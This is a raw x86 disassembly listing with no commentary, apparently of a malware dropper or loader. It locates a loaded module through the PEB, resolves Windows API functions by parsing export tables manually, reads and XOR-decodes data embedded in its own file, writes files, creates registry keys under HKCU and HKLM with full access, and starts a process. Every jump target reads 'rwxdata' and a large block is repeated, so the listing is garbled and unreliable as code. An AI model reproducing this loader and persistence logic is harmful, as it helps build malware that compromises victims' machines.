movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_46ee90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_46efc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_46e27d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_46ee90
add esp 0x4
call sub_46f050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_46f080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_46f080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_46ee90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_46ee90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_46ee90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_46ee90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_46efc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_46ee90
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_46efc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_46f050
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_46f080
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
